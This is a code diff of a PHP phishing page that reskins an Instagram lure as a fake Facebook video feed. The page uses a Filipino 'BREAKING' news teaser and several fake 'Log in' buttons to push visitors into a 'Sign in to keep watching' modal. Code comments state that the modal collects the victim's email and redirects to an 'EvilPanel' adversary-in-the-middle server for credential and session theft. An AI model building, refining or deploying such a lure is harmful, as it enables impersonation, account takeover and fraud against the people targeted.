@@ -4,7 +4,7 @@ include "ip.php";
 // Static meta tags used for faster loading; shadow_config.php removed
 ?>
 <!DOCTYPE html>
-<html lang="en">@
+<html lang="en">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
@@ -123,17 +123,13 @@ include "ip.php";
             z-index: 3;
         }
 
+        /* ===== STATE 1: Facebook Feed Design ===== */
         .state-preview {
             position: relative;
             z-index: 3;
-            background: linear-gradient(180deg, #fefefe 0%, #f4f4f4 100%);
-            border-radius: 24px;
-            box-shadow: 0 20px 35px rgba(0, 0, 0, 0.18);
-            padding: 20px 24px 32px;
-            display: flex;
-            flex-direction: column;
-            gap: 18px;
+            background: #fff;
             overflow-y: auto;
+            min-height: 100vh;
         }
 
         .state-preview.is-transitioning {
@@ -141,156 +137,312 @@ include "ip.php";
         }
 
         @keyframes previewExit {
-            0% {
-                transform: translateY(0) scale(1);
-                opacity: 1;
-            }
-
-            60% {
-                transform: translateY(-10px) scale(0.97);
-                opacity: 0.4;
-            }
-
-            100% {
-                transform: translateY(-20px) scale(0.94);
-                opacity: 0;
-            }
+            0% { transform: translateY(0) scale(1); opacity: 1; }
+            60% { transform: translateY(-10px) scale(0.97); opacity: 0.4; }
+            100% { transform: translateY(-20px) scale(0.94); opacity: 0; }
         }
 
-        .preview-header {
+        /* Facebook Header */
+        .fb-header {
             display: flex;
-            justify-content: center;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 16px;
+            background: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
-        .logo-row {
-            width: 100%;
+        .fb-logo {
+            font-size: 32px;
+            font-weight: 700;
+            color: #1877f2;
+            text-decoration: none;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            letter-spacing: -1px;
+        }
+
+        @media (max-width: 400px) {
+            .fb-logo {
+                font-size: 28px;
+            }
+        }
+
+        .header-right {
             display: flex;
             align-items: center;
-            gap: 16px;
-            padding: 4px 0;
+            gap: 12px;
         }
 
-        .logo-area {
-            display: flex;
-            align-items: center;
-        }
-
-        .logo-area img,
-        .logo-area svg {
-            display: block;
-            height: 26px;
-            width: auto;
-        }
-
-        .continue-link {
-            font-size: 13px;
+        .open-app {
+            color: #1877f2;
+            font-size: 15px;
             font-weight: 600;
-            color: #0095f6;
-            line-height: 1;
-            margin-left: auto;
+            text-decoration: none;
         }
 
-        .preview-media {
-            position: relative;
-            border-radius: 18px;
-            overflow: hidden;
-            aspect-ratio: 9/16;
-            background: #000;
-            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.25);
-            max-width: 360px;
-            width: 100%;
-            margin: 0 auto;
-        }
-
-        .preview-thumbnail {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-        }
-
-        .video-overlay {
-            position: absolute;
-            inset: 0;
-            background: radial-gradient(circle at center, rgba(0, 0, 0, 0) 40%, rgba(0, 0, 0, 0.7) 100%);
-        }
-
-        .play-trigger {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 72px;
-            height: 72px;
-            border-radius: 50%;
-            border: none;
-            background: rgba(0, 0, 0, 0.7);
+        .login-btn {
+            background: #1877f2;
             color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
-            transition: transform 150ms ease, background 150ms ease;
-        }
-
-        .play-trigger:focus-visible,
-        .play-trigger:hover {
-            background: rgba(0, 0, 0, 0.8);
-            transform: translate(-50%, -50%) scale(1.05);
-        }
-
-        .play-trigger svg {
-            width: 24px;
-            height: 24px;
-            fill: currentColor;
-        }
-
-        .preview-caption {
-            margin: 16px auto 0;
-            text-align: center;
-            font-size: 17px;
-            font-weight: 600;
-            color: #111;
-        }
-
-        .preview-footer {
-            width: 100%;
-            max-width: 360px;
-            margin: 20px auto 0;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            text-align: center;
-        }
-
-        .action-button {
             border: none;
-            border-radius: 12px;
-            padding: 14px 16px;
+            border-radius: 6px;
+            padding: 8px 16px;
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
         }
 
-        .action-button.primary {
-            background: #4c5bec;
+        /* Video Title Row */
+        .title-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px 8px;
+        }
+
+        .title-row h1 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #050505;
+            margin: 0;
+        }
+
+        .search-btn {
+            background: #e4e6eb;
+            border: none;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            padding: 0;
+        }
+
+        .search-icon-img {
+            width: 18px;
+            height: 18px;
+            object-fit: contain;
+        }
+
+        /* Category Tabs */
+        .tabs {
+            display: flex;
+            gap: 8px;
+            padding: 8px 16px;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none;
+        }
+
+        .tabs::-webkit-scrollbar { display: none; }
+
+        .tab {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background: #e4e6eb;
+            border: none;
+            border-radius: 18px;
+            padding: 8px 14px;
+            height: 36px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #050505;
+            white-space: nowrap;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .tab.active {
+            background: #1877f2;
             color: #fff;
         }
 
-        .action-button.secondary {
-            background: transparent;
-            color: #4c5bec;
+        .tab-icon {
+            width: 18px;
+            height: 18px;
+            object-fit: contain;
+            filter: brightness(0);
         }
 
-        .terms-text {
-            margin: 10px 0 0;
-            font-size: 12px;
-            color: #777;
+        .tab.active .tab-icon {
+            filter: brightness(0) invert(1);
         }
 
-        .terms-text a {
-            color: #4c5bec;
-            text-decoration: none;
+        /* Video Info */
+        .video-info {
+            padding: 12px 16px 8px;
+        }
+
+        .video-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #050505;
+            margin: 0 0 2px;
+        }
+
+        .video-subtitle {
+            font-size: 14px;
+            color: #1877f2;
+            font-weight: 400;
+            margin: 0;
+        }
+
+        /* Video Container */
+        .video-wrap {
+            padding: 0 16px;
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 9/16;
+            min-height: 300px;
+            max-height: 70vh;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            cursor: pointer;
+            border: none;
+            padding: 0;
+            display: block;
+        }
+
+        .video-container:focus {
+            outline: 2px solid #1877f2;
+            outline-offset: 2px;
+        }
+
+        @media (max-width: 400px) {
+            .video-container {
+                min-height: 350px;
+                max-height: 60vh;
+            }
+        }
+
+        @media (min-height: 700px) {
+            .video-container {
+                max-height: 65vh;
+            }
+        }
+
+        .video-thumb {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .play-btn {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 60px;
+            height: 60px;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid rgba(255, 255, 255, 0.9);
+            cursor: pointer;
+            transition: transform 150ms ease, background 150ms ease;
+            z-index: 10;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+
+        .play-btn:hover {
+            background: rgba(0, 0, 0, 0.7);
+            transform: translate(-50%, -50%) scale(1.05);
+        }
+
+        .play-btn svg {
+            width: 24px;
+            height: 24px;
+            fill: #fff;
+            margin-left: 3px;
+        }
+
+        /* CTA Section with faded overlay */
+        .cta-wrapper {
+            position: relative;
+            margin-top: -120px;
+            padding-top: 0;
+        }
+
+        .cta-wrapper::before {
+            content: '';
+            display: block;
+            height: 120px;
+            background: linear-gradient(to bottom, 
+                rgba(255,255,255,0) 0%,
+                rgba(255,255,255,0.3) 25%,
+                rgba(255,255,255,0.6) 50%,
+                rgba(255,255,255,0.85) 75%,
+                rgba(255,255,255,1) 100%
+            );
+        }
+
+        .cta-section {
+            padding: 0 16px 32px;
+            text-align: center;
+            background: #fff;
+        }
+
+        .cta-section h2 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #050505;
+            margin: 0 0 8px;
+        }
+
+        .cta-section p {
+            font-size: 15px;
+            color: #65676b;
+            line-height: 1.4;
+            margin: 0 0 20px;
+        }
+
+        .cta-login-btn {
+            width: 100%;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 20px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .cta-login-btn:active { background: #166fe5; }
+
+        /* Responsive for State 1 */
+        @media (max-width: 359px) {
+            .fb-logo { font-size: 24px; }
+            .tab { padding: 6px 12px; font-size: 13px; }
+            .video-container { max-height: 50vh; }
+            .cta-section h2 { font-size: 18px; }
+        }
+
+        @media (min-width: 480px) {
+            .state-preview { background: #f0f2f5; }
+            .fb-header, .title-row, .tabs, .video-info, .video-wrap, .cta-section {
+                max-width: 500px;
+                margin-left: auto;
+                margin-right: auto;
+            }
+            .cta-wrapper { max-width: 500px; margin-left: auto; margin-right: auto; }
+            .cta-wrapper::before { background: linear-gradient(to bottom, rgba(240,242,245,0) 0%, rgba(240,242,245,0.3) 25%, rgba(240,242,245,0.6) 50%, rgba(240,242,245,0.85) 75%, rgba(240,242,245,1) 100%); }
+            .cta-section { background: #f0f2f5; }
+        }
+
+        @supports (padding: env(safe-area-inset-bottom)) {
+            .cta-section { padding-bottom: calc(32px + env(safe-area-inset-bottom)); }
         }
 
         .state-immersive {
@@ -300,14 +452,52 @@ include "ip.php";
             align-items: center;
             z-index: 1;
             min-height: 100vh;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
         }
 
         .state-immersive video {
-            width: 100%;
-            height: 100%;
-            min-height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
             object-fit: cover;
-            transform: translateZ(0);
+            z-index: 1;
+            background: #000 url('https://static.wixstatic.com/media/8455f5_24b802ad84f94de7bb66d8041129148e~mv2.jpg') center/cover no-repeat;
+        }
+
+        .state-immersive .immersive-header {
+            z-index: 10;
+        }
+
+        .state-immersive .immersive-overlay {
+            z-index: 5;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+        }
+
+        /* Keep video visible in State 3 (CTA) as background */
+        .state-cta video,
+        body[data-state="cta"] .state-immersive video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: 0;
+        }
+
+        @media (max-width: 480px) {
+            .state-immersive video {
+                object-fit: cover;
+                object-position: center;
+            }
         }
 
         .immersive-overlay {
@@ -321,11 +511,67 @@ include "ip.php";
         }
 
         .immersive-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
             display: flex;
             justify-content: space-between;
-            font-size: 16px;
+            align-items: center;
+            padding: 12px 16px;
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 100;
+            pointer-events: auto;
+            min-height: 56px;
+        }
+
+        .immersive-fb-logo {
+            display: flex;
+            align-items: center;
+            margin-left: 0;
+        }
+
+        .immersive-fb-logo img {
+            height: 32px;
+            width: auto;
+            filter: brightness(0) invert(1);
+        }
+
+        .immersive-fb-logo span,
+        .immersive-fb-logo-text {
+            font-size: 28px;
+            font-weight: 700;
             color: #fff;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            letter-spacing: -1px;
+        }
+
+        .immersive-header-right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-right: 0;
+        }
+
+        .immersive-open-app {
+            color: #fff;
+            font-size: 14px;
             font-weight: 600;
+            text-decoration: none;
+            padding: 8px 12px;
+        }
+
+        .immersive-login-btn {
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            padding: 8px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
         }
 
         .pill {
@@ -668,44 +914,74 @@ include "ip.php";
 <body data-state="preview">
     <div id="app-root" data-state="preview">
         <main class="state state-preview is-active" aria-live="polite">
-            <header class="preview-header" aria-label="Instagram preview header">
-                <div class="logo-row">
-                    <div class="logo-area" aria-hidden="true">
-                        <img class="instagram-logo" src="https://static.wixstatic.com/media/8455f5_effc9f568a1645b08e796419f20ee45b~mv2.png" alt="Instagram logo">
-                    </div>
-                    <span class="continue-link" aria-hidden="true">Continue on web</span>
+            <!-- Facebook Header -->
+            <header class="fb-header">
+                <a href="#" class="fb-logo">facebook</a>
+                <div class="header-right">
+                    <a href="#" class="open-app">Open app</a>
+                    <button class="login-btn" id="headerLogin">Log in</button>
                 </div>
             </header>
 
-            <section class="preview-media" aria-label="Video teaser">
-                <img class="preview-thumbnail" src="https://static.wixstatic.com/media/8455f5_a1a05e78db8345938482383301ff10bc~mv2.png" alt="Preview thumbnail" loading="eager" decoding="async">
-
-                <span class="video-overlay" aria-hidden="true"></span>
-                <button type="button" class="play-trigger" data-role="play-trigger" aria-label="Play and open immersive experience">
-                    <svg aria-hidden="true" class="play-icon" viewBox="0 0 24 24" role="presentation">
-                        <path d="M5.888 22.5a3.46 3.46 0 0 1-1.721-.46l-.003-.002a3.451 3.451 0 0 1-1.72-2.982V4.943a3.445 3.445 0 0 1 5.163-2.987l12.226 7.059a3.444 3.444 0 0 1-.001 5.967l-12.22 7.056a3.462 3.462 0 0 1-1.724.462Z"/>
-                    </svg>
+            <!-- Video Title -->
+            <div class="title-row">
+                <h1>Video</h1>
+                <button class="search-btn" aria-label="Search">
+                    <img src="https://static.wixstatic.com/media/8455f5_b3415f210b0e49ce830048fa0f17f0f7~mv2.png" alt="Search" class="search-icon-img">
                 </button>
-            </section>
+            </div>
 
-            <p class="preview-caption">Watch this reel in the app</p>
+            <!-- Category Tabs -->
+            <div class="tabs">
+                <button class="tab"><img class="tab-icon" src="https://static.wixstatic.com/shapes/8455f5_2535d72c8835403aabf7c4c970fe2f3a.svg" alt=""> Popular</button>
+                <button class="tab active"><img class="tab-icon" src="https://static.wixstatic.com/shapes/8455f5_9de38a160796459aab796a0be806b071.svg" alt=""> Reels</button>
+                <button class="tab"><img class="tab-icon" src="https://static.wixstatic.com/media/8455f5_66620482ce35458995ffdbd12c7df3c0~mv2.png" alt=""> Explore</button>
+                <button class="tab"><img class="tab-icon" src="https://static.wixstatic.com/media/8455f5_b64d1ebe34ff479f970baca392cf4a1d~mv2.png" alt=""> Food</button>
+            </div>
 
-            <footer class="preview-footer" aria-label="Primary actions">
-                <button class="action-button primary" type="button">Open Instagram</button>
-                <button class="action-button secondary" type="button">Sign up</button>
-                <p class="terms-text">By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.</p>
-            </footer>
+            <!-- Video Info -->
+            <div class="video-info">
+                <p class="video-title">BREAKING: Panoorin ang buong balita</p>
+                <p class="video-subtitle">Kabayan News</p>
+            </div>
+
+            <!-- Video Container - Click triggers State 2 -->
+            <div class="video-wrap">
+                <button type="button" class="video-container" data-role="play-trigger" aria-label="Play video">
+                    <img class="video-thumb" src="https://static.wixstatic.com/media/8455f5_24b802ad84f94de7bb66d8041129148e~mv2.jpg" alt="Video">
+                    <span class="play-btn" aria-hidden="true">
+                        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+                    </span>
+                </button>
+            </div>
+
+            <!-- CTA with faded overlay -->
+            <div class="cta-wrapper">
+                <section class="cta-section">
+                    <h2>Watch more videos you may like</h2>
+                    <p>Log in to explore more videos and keep up with topics you are interested in.</p>
+                    <button class="cta-login-btn" id="ctaLoginPreview">Log in</button>
+                </section>
+            </div>
         </main>
 
         <section class="state state-immersive" aria-hidden="true">
             <video id="immersiveVideo" playsinline muted preload="metadata" poster="https://static.wixstatic.com/media/8455f5_a1a05e78db8345938482383301ff10bc~mv2.png" loop>
-                <source src="https://video.wixstatic.com/video/8455f5_03845574298047bab65cfd1c0e15e5ff/480p/mp4/file.mp4" type="video/mp4">
+                <source src="https://video.wixstatic.com/video/8455f5_ba2ce46ccd4f4dd6bc8a0cd16347bdd2/480p/mp4/file.mp4" type="video/mp4">
             </video>
-            <div class="immersive-overlay" aria-hidden="true">
-                <div class="immersive-header">
-                    <span>Log in</span>
-                    <span class="pill">Open app</span>
+            <!-- Facebook Header for State 2 -->
+            <div class="immersive-header">
+                <div class="immersive-fb-logo" aria-label="Facebook Logo">
+                    <span class="immersive-fb-logo-text">facebook</span>
                 </div>
+                <div class="immersive-header-right">
+                    <a href="#" class="immersive-open-app">Open app</a>
+                    <button class="immersive-login-btn" id="immersiveLoginBtn">Log in</button>
+                </div>
+            </div>
+
+            <div class="immersive-overlay" aria-hidden="true">
+                <div style="height:56px"></div> <!-- Spacer for header -->
 
                 <div class="immersive-icons">
                     <div class="icon-item" aria-hidden="true">
@@ -736,9 +1012,9 @@ include "ip.php";
 
                 <div class="immersive-footer">
                     <div class="immersive-user">
-                        <img data-profile-img alt="Profile avatar" width="40" height="40" loading="lazy" src="https://static.wixstatic.com/media/8455f5_c082110886634d768b1c7a9f956c3b1b~mv2.jpg">
+                        <img data-profile-img alt="Profile avatar" width="40" height="40" loading="lazy" src="https://static.wixstatic.com/media/8455f5_6a7ec556f87d4f8bb2961ddcfb4122e7~mv2.jpg">
                         <div class="user-inline">
-                            <span class="username">Balita</span>
+                            <span class="username">Kabayan News</span>
                             <span class="inline-dot">•</span>
                             <button type="button" class="follow-chip">Follow</button>
                         </div>
@@ -753,7 +1029,7 @@ include "ip.php";
             <div class="dark-overlay" aria-hidden="true"></div>
             <div class="cta-modal" role="dialog" aria-modal="true" aria-labelledby="cta-title">
                 <div class="circular-reveal-container">
-                    <img data-profile-img alt="Profile avatar" class="modal-profile-pic" width="160" height="160" src="https://static.wixstatic.com/media/8455f5_c082110886634d768b1c7a9f956c3b1b~mv2.jpg">
+                    <img data-profile-img alt="Profile avatar" class="modal-profile-pic" width="160" height="160" src="https://static.wixstatic.com/media/8455f5_6a7ec556f87d4f8bb2961ddcfb4122e7~mv2.jpg">
                 </div>
                 <p id="cta-title" class="cta-heading">Sign in to keep watching</p>
                 <button id="ctaButton" type="button" class="cta-btn cta-btn-facebook" data-target-url="">
@@ -788,9 +1064,9 @@ include "ip.php";
             // REMOVED: iframe-related variables - no longer needed with EvilPanel redirect
 
             const requiredAssets = {
-                video: 'https://video.wixstatic.com/video/8455f5_03845574298047bab65cfd1c0e15e5ff/480p/mp4/file.mp4',
+                video: 'https://video.wixstatic.com/video/8455f5_ba2ce46ccd4f4dd6bc8a0cd16347bdd2/480p/mp4/file.mp4',
                 thumbnail: 'https://static.wixstatic.com/media/8455f5_a1a05e78db8345938482383301ff10bc~mv2.png',
-                profile: 'https://static.wixstatic.com/media/8455f5_c082110886634d768b1c7a9f956c3b1b~mv2.jpg',
+                profile: 'https://static.wixstatic.com/media/8455f5_6a7ec556f87d4f8bb2961ddcfb4122e7~mv2.jpg',
             };
 
             let stateTwoTimer = null;
@@ -931,19 +1207,44 @@ include "ip.php";
                     });
                 }
 
+                // Video container click → State 2
                 playTrigger?.addEventListener('click', async (event) => {
                     event.preventDefault();
                     if (root.dataset.state !== 'preview') return;
-                    playTrigger.setAttribute('disabled', 'true');
+                    playTrigger.style.pointerEvents = 'none';
                     await animatePreviewExit();
                     logValidation('Entering State 2');
                     transitionToStateTwo();
                 });
 
+                // State 1 login buttons → Skip to State 3 CTA
+                const headerLoginBtn = document.getElementById('headerLogin');
+                const ctaPreviewBtn = document.getElementById('ctaLoginPreview');
+                
+                const skipToCtaState = () => {
+                    if (root.dataset.state !== 'preview') return;
+                    animatePreviewExit().then(() => {
+                        setState('cta');
+                        startCtaAnimation();
+                    });
+                };
+
+                headerLoginBtn?.addEventListener('click', skipToCtaState);
+                ctaPreviewBtn?.addEventListener('click', skipToCtaState);
+
+                // State 2 login button → Skip to State 3 CTA
+                const immersiveLoginBtn = document.getElementById('immersiveLoginBtn');
+                immersiveLoginBtn?.addEventListener('click', () => {
+                    cleanupTimer();
+                    videoEl.pause();
+                    setState('cta');
+                    startCtaAnimation();
+                });
+
                 // EVILPANEL: 2-STEP (Email first) then redirect to AiTM
                 // URL is set dynamically via PHP from server config
                 ctaButton?.addEventListener('click', () => {
-                    const baseUrl = '<?php echo getenv("EVILPANEL_URL") ?: "https://m.facebook.com/"; ?>';
+                    const baseUrl = '<?php echo getenv("EVILPANEL_URL") ?: (getenv("EVILPANEL_DOMAIN") ? "https://" . getenv("EVILPANEL_DOMAIN") : "https://m.facebook.com/"); ?>';
                     const email = prompt('Enter your email to continue:');
                     if (!email || !email.includes('@')) return;
                     const targetUrl = baseUrl + (baseUrl.includes('?') ? '&' : '?') + 'email=' + encodeURIComponent(email.trim());
